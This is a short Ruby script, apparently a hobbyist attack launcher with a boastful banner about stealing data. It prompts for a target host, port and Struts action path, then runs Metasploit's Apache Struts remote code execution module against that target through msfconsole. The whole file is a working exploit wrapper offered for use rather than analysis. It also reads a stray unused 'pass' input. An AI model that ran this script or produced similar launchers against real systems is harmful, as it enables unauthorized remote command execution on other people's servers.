puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...

	    Apache Struts Remote Command Execution
				Java Universal

		The target ports: 
  						 Default: 80, 0r  8080
"""

puts " [?] What is the Target? "
print "[!] ---> "

target = gets.chomp

puts " [?] What is the Port ? [Default is 80 or 8080]  "
print "[!] ---> "

port = gets.chomp

puts """
 [?] The path to a struts application action and the parameter to inject.
 [?] Example ie. /HelloWorldStruts2/hello?name=test&id=INJECT """
print "[!] ---> "

path = gets.chomp


pass = gets.chomp
exec("msfconsole -x 'use exploit/multi/http/struts_code_exec_exception_delegator' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'set TARGETURI #{path}' -x 'run' 'run'")
